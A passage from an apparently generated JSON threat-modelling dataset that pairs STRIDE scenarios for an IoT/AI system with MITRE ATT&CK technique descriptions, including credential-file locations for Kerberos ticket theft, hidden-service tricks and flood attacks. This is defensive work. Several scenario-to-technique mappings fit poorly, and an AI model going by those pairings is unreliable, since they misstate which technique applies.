            "Scenario": "Data collected by sensors is intercepted and exfiltrated by an attacker exploiting a wireless network vulnerability.",
            "Assumptions": [
                {
                    "Assumption": "Wireless network encryption is weak or outdated.",
                    "Role": "Network Administrator",
                    "Condition": "Use of outdated encryption standards."
                },
                {
                    "Assumption": "Sensor data transmissions are not end-to-end encrypted.",
                    "Role": "System Developer",
                    "Condition": "Lack of end-to-end encryption."
                },
                {
                    "Assumption": "No network intrusion detection systems are in place.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of intrusion detection measures."
                }
            ],
            "Potential Impact": "Sensitive data transmission is intercepted, leading to unauthorized disclosure of the collected data.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "wireless vulnerability",
                "sensors",
                "exfiltration"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker exploits a vulnerability in the user interface to access unauthorized data through a UI-based exploit.",
            "Assumptions": [
                {
                    "Assumption": "User interface code has unpatched vulnerabilities.",
                    "Role": "System Developer",
                    "Condition": "Presence of unpatched or zero-day vulnerabilities."
                },
                {
                    "Assumption": "Authentication and authorization mechanisms are weak.",
                    "Role": "System Architect",
                    "Condition": "Insufficient access control mechanisms."
                },
                {
                    "Assumption": "Users do not practice safe browsing or download habits.",
                    "Role": "User",
                    "Condition": "Poor cybersecurity hygiene."
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive data displayed or accessible through the user interface.",
            "MITRE ATT&CK Keywords": [
                "UI exploit",
                "unauthorized access",
                "vulnerabilities",
                "sensitive data"
            ],
            "mitre_technique": {
                "name": "Exploit Public-Facing Application",
                "description": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation: CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169) Depending on the flaw being exploited this may also involve [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211) or [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203).\n\nIf an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611), or take advantage of weak identity and access management policies.\n\nAdversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses.(Citation: Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)",
                "id": "attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c",
                "technique_id": "T1190"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker initiates a Distributed Denial of Service (DDoS) attack to flood the communication infrastructure, causing disruptions in data flow.",
            "Assumptions": [
                {
                    "Assumption": "The communication infrastructure is publicly accessible and does not have rate limiting.",
                    "Role": "System Architect",
                    "Condition": "Lack of rate limiting."
                },
                {
                    "Assumption": "Network resources are not sufficiently monitored or protected.",
                    "Role": "Network Administrator",
                    "Condition": "Inadequate monitoring of network resources."
                },
                {
                    "Assumption": "No DDoS mitigation strategies are in place.",
                    "Role": "Security Analyst",
                    "Condition": "Absence of DDoS protection mechanisms."
                }
            ],
            "Potential Impact": "Service disruptions and reduced system availability, impacting user access and functionality.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "network flooding",
                "service disruption",
                "communication infrastructure"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware specifically designed to exploit vulnerabilities in smart devices causes those devices to become inoperative.",
            "Assumptions": [
                {
                    "Assumption": "Smart devices have unpatched vulnerabilities.",
                    "Role": "Device Manufacturer",
                    "Condition": "Unpatched or known vulnerabilities."
                },
                {
                    "Assumption": "Devices do not have protective measures against such malware.",
                    "Role": "System Developer",
                    "Condition": "Lack of deployed protective measures."
                },
                {
                    "Assumption": "The system does not have anti-malware solutions in place.",
                    "Role": "System Administrator",
                    "Condition": "No anti-malware solutions deployed."
                }
            ],
            "Potential Impact": "Reduced device availability, leading to loss of system functionality and potential safety risks.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "vulnerability exploitation",
                "device inoperability",
                "Denial of Service"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker gains control over multiple user devices and uses them to perform a botnet-based attack against the IoT system.",
            "Assumptions": [
                {
                    "Assumption": "User devices lack sufficient security protections against botnets.",
                    "Role": "Device Owner",
                    "Condition": "Inadequate security protection."
                },
                {
                    "Assumption": "Network traffic is not adequately monitored.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient network monitoring."
                },
                {
                    "Assumption": "System does not enforce stringent security policies on user devices.",
                    "Role": "System Administrator",
                    "Condition": "Weak security policies."
                }
            ],
            "Potential Impact": "Disruption of services and degradation of system performance, impacting user experience and business operations.",
            "MITRE ATT&CK Keywords": [
                "botnet",
                "device takeover",
                "service disruption",
                "performance degradation"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability to gain administrative privileges on the central AI/ML system.",
            "Assumptions": [
                {
                    "Assumption": "Software has an unpatched or zero-day vulnerability.",
                    "Role": "Software Developer",
                    "Condition": "Presence of vulnerabilities."
                },
                {
                    "Assumption": "The system does not implement the principle of least privilege.",
                    "Role": "System Architect",
                    "Condition": "No least privilege enforcement."
                },
                {
                    "Assumption": "Security patches are not regularly applied.",
                    "Role": "System Administrator",
                    "Condition": "Delayed patching."
                }
            ],
            "Potential Impact": "Full control over the AI/ML system, leading to potential widespread system compromise and manipulation of critical data.",
            "MITRE ATT&CK Keywords": [
                "vulnerability exploitation",
                "administrative access",
                "AI/ML system",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "Windows Service",
                "description": "Adversaries may create or modify Windows services to repeatedly execute malicious payloads as part of persistence. When Windows boots up, it starts programs or applications called services that perform background system functions.(Citation: TechNet Services) Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Windows Registry.\n\nAdversaries may install a new service or modify an existing service to execute at startup in order to persist on a system. Service configurations can be set or modified using system utilities (such as sc.exe), by directly modifying the Registry, or by interacting directly with the Windows API. \n\nAdversaries may also use services to install and execute malicious drivers. For example, after dropping a driver file (ex: `.sys`) to disk, the payload can be loaded and registered via [Native API](https://attack.mitre.org/techniques/T1106) functions such as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()` and `ZwSetValueKey()`), by creating the required service Registry values (i.e. [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s to hide the presence of malicious activity on a system. Adversaries may also load a signed yet vulnerable driver onto a compromised machine (known as \"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo make detection analysis more challenging, malicious services may also incorporate [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004) (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example by using the `sc sdset` command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as `Get-Service`, `sc query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)",
                "id": "attack-pattern--2959d63f-73fd-46a1-abd2-109d7dcede32",
                "technique_id": "T1543.003"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses social engineering to trick an employee into giving their administrative credentials, gaining higher-level access.",
            "Assumptions": [
                {
                    "Assumption": "Employees are not adequately trained to recognize social engineering attacks.",
                    "Role": "HR Manager",
                    "Condition": "Lack of cybersecurity training."
                },
                {
                    "Assumption": "Single-factor authentication is in use.",
                    "Role": "System Architect",
                    "Condition": "Only single-factor authentication implemented."
                },
                {
                    "Assumption": "Internal security practices for handling credentials are weak.",
                    "Role": "Employee",
                    "Condition": "Poor security practices."
                }
            ],
            "Potential Impact": "Unauthorized higher-level access leading to potential system manipulation and data breaches.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "credential theft",
                "administrative credentials",
                "privilege elevation"
            ],
            "mitre_technique": {
                "name": "Valid Accounts",
                "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nIn some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)\n\nThe overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)",
                "id": "attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81",
                "technique_id": "T1078"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a misconfiguration in access control settings to gain higher privileges than intended.",
            "Assumptions": [
                {
                    "Assumption": "Access control settings are poorly configured.",
                    "Role": "System Administrator",
                    "Condition": "Misconfigurations present."
                },
                {
                    "Assumption": "No proper auditing of access control configurations.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of regular auditing."
                },
                {
                    "Assumption": "The system does not enforce strict access control policies.",
                    "Role": "System Architect",
                    "Condition": "Weak access control policies."
                }
            ],
            "Potential Impact": "Unauthorized higher-level access leading to potential misuse of system resources and data breaches.",
            "MITRE ATT&CK Keywords": [
                "misconfiguration",
                "access control",
                "privilege elevation",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Steal or Forge Kerberos Tickets",
                "description": "Adversaries may attempt to subvert Kerberos authentication by stealing or forging Kerberos tickets to enable [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). Kerberos is an authentication protocol widely used in modern Windows domain environments. In Kerberos environments, referred to as \u201crealms\u201d, there are three basic participants: client, service, and Key Distribution Center (KDC).(Citation: ADSecurity Kerberos Ring Decoder) Clients request access to a service and through the exchange of Kerberos tickets, originating from KDC, they are granted access after having successfully authenticated. The KDC is responsible for both authentication and ticket granting.  Adversaries may attempt to abuse Kerberos by stealing tickets or forging tickets to enable unauthorized access.\n\nOn Windows, the built-in <code>klist</code> utility can be used to list and analyze cached Kerberos tickets.(Citation: Microsoft Klist)\n\nLinux systems on Active Directory domains store Kerberos credentials locally in the credential cache file referred to as the \"ccache\". The credentials are stored in the ccache file while they remain valid and generally while a user's session lasts.(Citation: MIT ccache) On modern Redhat Enterprise Linux systems, and derivative distributions, the System Security Services Daemon (SSSD) handles Kerberos tickets. By default SSSD maintains a copy of the ticket database that can be found in <code>/var/lib/sss/secrets/secrets.ldb</code> as well as the corresponding key located in <code>/var/lib/sss/secrets/.secrets.mkey</code>. Both files require root access to read. If an adversary is able to access the database and key, the credential cache Kerberos blob can be extracted and converted into a usable Kerberos ccache file that adversaries may use for [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003). The ccache file may also be converted into a Windows format using tools such as Kekeo.(Citation: Linux Kerberos Tickets)(Citation: Brining MimiKatz to Unix)(Citation: Kekeo)\n\n\nKerberos tickets on macOS are stored in a standard ccache format, similar to Linux. By default, access to these ccache entries is federated through the KCM daemon process via the Mach RPC protocol, which uses the caller's environment to determine access. The storage location for these ccache entries is influenced by the <code>/etc/krb5.conf</code> configuration file and the <code>KRB5CCNAME</code> environment variable which can specify to save them to disk or keep them protected via the KCM daemon. Users can interact with ticket storage using <code>kinit</code>, <code>klist</code>, <code>ktutil</code>, and <code>kcc</code> built-in binaries or via Apple's native Kerberos framework. Adversaries can use open source tools to interact with the ccache files directly or to use the Kerberos framework to call lower-level APIs for extracting the user's TGT or Service Tickets.(Citation: SpectorOps Bifrost Kerberos macOS 2019)(Citation: macOS kerberos framework MIT)\n",
                "id": "attack-pattern--3fc01293-ef5e-41c6-86ce-61f10706b64a",
                "technique_id": "T1558"
            }
        }
    ]
},
{
    "case_number": "7",
    "batch_number": "30",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker bypasses authentication by spoofing biometric data sent from sensors.",
            "Assumptions": [
                {
                    "Assumption": "Sensors are compromised or lack adequate encryption",
                    "Role": "Attacker",
                    "Condition": "Valid when security protocols are weak or absent"
                },
                {
                    "Assumption": "Biometric data is sent over an insecure network",
                    "Role": "System Designer",
                    "Condition": "Valid when encryption is not enforced"
                },
                {
                    "Assumption": "The authentication system does not detect synthetic biometric data",
                    "Role": "System Operator",
                    "Condition": "Valid if AI models are not trained to identify anomalies"
                }
            ],
            "Potential Impact": "Unauthorized access to sensitive areas or data",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "biometrics",
                "sensor network"
            ],
            "mitre_technique": {
                "name": "GUI Input Capture",
                "description": "Adversaries may mimic common operating system GUI components to prompt users for credentials with a seemingly legitimate prompt. When programs are executed that need additional privileges than are present in the current user context, it is common for the operating system to prompt the user for proper credentials to authorize the elevated privileges for the task (ex: [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)).\n\nAdversaries may mimic this functionality to prompt users for credentials with a seemingly legitimate prompt for a number of reasons that mimic normal usage, such as a fake installer requiring additional access or a fake malware removal suite.(Citation: OSX Malware Exploits MacKeeper) This type of prompt can be used to collect credentials via various languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002)(Citation: LogRhythm Do You Trust Oct 2014)(Citation: OSX Keydnap malware)(Citation: Spoofing credential dialogs) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).(Citation: LogRhythm Do You Trust Oct 2014)(Citation: Enigma Phishing for Credentials Jan 2015)(Citation: Spoofing credential dialogs) On Linux systems adversaries may launch dialog boxes prompting users for credentials from malicious shell scripts or the command line (i.e. [Unix Shell](https://attack.mitre.org/techniques/T1059/004)).(Citation: Spoofing credential dialogs)\n\nAdversaries may also mimic common software authentication requests, such as those from browsers or email clients. This may also be paired with user activity monitoring (i.e., [Browser Information Discovery](https://attack.mitre.org/techniques/T1217) and/or [Application Window Discovery](https://attack.mitre.org/techniques/T1010)) to spoof prompts when users are naturally accessing sensitive sites/data.",
                "id": "attack-pattern--a2029942-0a85-4947-b23c-ca434698171d",
                "technique_id": "T1056.002"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker uses a compromised smart card to gain unauthorized access.",
            "Assumptions": [
                {
                    "Assumption": "Smart card credentials are not regularly updated",
                    "Role": "IT Administrator",
                    "Condition": "Valid if credential rotation policies are not in place"
                },
                {
                    "Assumption": "Smart cards can be duplicated without detection",
                    "Role": "Attacker",
                    "Condition": "Valid when cloning techniques are effective"
                },
                {
                    "Assumption": "User verification steps are minimal",
                    "Role": "System Designer",
                    "Condition": "Valid if secondary authentication is not implemented"
                }
            ],
            "Potential Impact": "Unauthorized access and potential data breaches",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "smart cards",
                "infiltration"
            ],
            "mitre_technique": {
                "name": "Multi-Factor Authentication Interception",
                "description": "Adversaries may target multi-factor authentication (MFA) mechanisms, (i.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than usernames and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms. \n\nIf a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token. (Citation: Mandiant M Trends 2011)\n\nAdversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes). (Citation: GCN RSA June 2011)\n\nOther methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Service providers can also be targeted: for example, an adversary may compromise an SMS messaging service in order to steal MFA codes sent to users\u2019 phones.(Citation: Okta Scatter Swine 2022)",
                "id": "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49",
                "technique_id": "T1111"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker sends fake commands to actuators by spoofing network packets.",
            "Assumptions": [
                {
                    "Assumption": "Network communication is not encrypted",
                    "Role": "Network Engineer",
                    "Condition": "Valid if encryption protocols are weak or non-existent"
                },
                {
                    "Assumption": "Actuators accept commands from any source",
                    "Role": "System Designer",
                    "Condition": "Valid when no source validation is performed"
                },
                {
                    "Assumption": "Attackers have access to the network",
                    "Role": "Attacker",
                    "Condition": "Valid in poorly secured environments"
                }
            ],
            "Potential Impact": "Unintended actuator behavior causing physical harm or service disruptions",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network packet",
                "actuator control"
            ],
            "mitre_technique": {
                "name": "ARP Cache Poisoning",
                "description": "Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002).\n\nThe ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.(Citation: RFC826 ARP) Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.\n\nAn adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.\n\nThe ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.(Citation: Sans ARP Spoofing Aug 2003)(Citation: Cylance Cleaver)\n\nAdversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.(Citation: Sans ARP Spoofing Aug 2003)\n",
                "id": "attack-pattern--cabe189c-a0e3-4965-a473-dcff00f17213",
                "technique_id": "T1557.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious actors tamper with sensor data to provide false environmental readings.",
            "Assumptions": [
                {
                    "Assumption": "Sensors lack physical security",
                    "Role": "Facility Manager",
                    "Condition": "Valid if physical access controls are weak"
                },
                {
                    "Assumption": "Data integrity checks are not performed",
                    "Role": "System Designer",
                    "Condition": "Valid when data validation is not implemented"
                },
                {
                    "Assumption": "Real-time monitoring is inadequate",
                    "Role": "System Operator",
                    "Condition": "Valid if anomalies are not actively monitored"
                }
            ],
            "Potential Impact": "Incorrect environmental adaptations leading to discomfort or harm",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "sensor data",
                "environmental control"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "id": "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
                "technique_id": "T1054"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Database entries in the data repositories are altered by an attacker.",
            "Assumptions": [
                {
                    "Assumption": "Database access controls are insufficient",
                    "Role": "Database Administrator",
                    "Condition": "Valid when permissions are not properly managed"
                },
                {
                    "Assumption": "Logs of database changes are not maintained",
                    "Role": "System Operator",
                    "Condition": "Valid when audit trails are absent"
                },
                {
                    "Assumption": "Vulnerable software versions are in use",
                    "Role": "IT Administrator",
                    "Condition": "Valid if patches are not applied"
                }
            ],
            "Potential Impact": "Compromised data integrity affecting decision-making processes",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "database",
                "data alteration"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Actuators are reprogrammed to operate outside safety parameters.",
            "Assumptions": [
                {
                    "Assumption": "Programming interfaces are not secured",
                    "Role": "System Engineer",
                    "Condition": "Valid if interface security is inadequate"
                },
                {
                    "Assumption": "Software checks for actuator commands are bypassed",
                    "Role": "Attacker",
                    "Condition": "Valid if security validations are weak"
                },
                {
                    "Assumption": "Physical security of actuators is compromised",
                    "Role": "Facility Manager",
                    "Condition": "Valid when physical access controls are limited"
                }
            ],
            "Potential Impact": "Physical damage to equipment or harm to individuals",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "actuator control",
                "physical security"
            ],
            "mitre_technique": {
                "name": "Disable or Modify Tools",
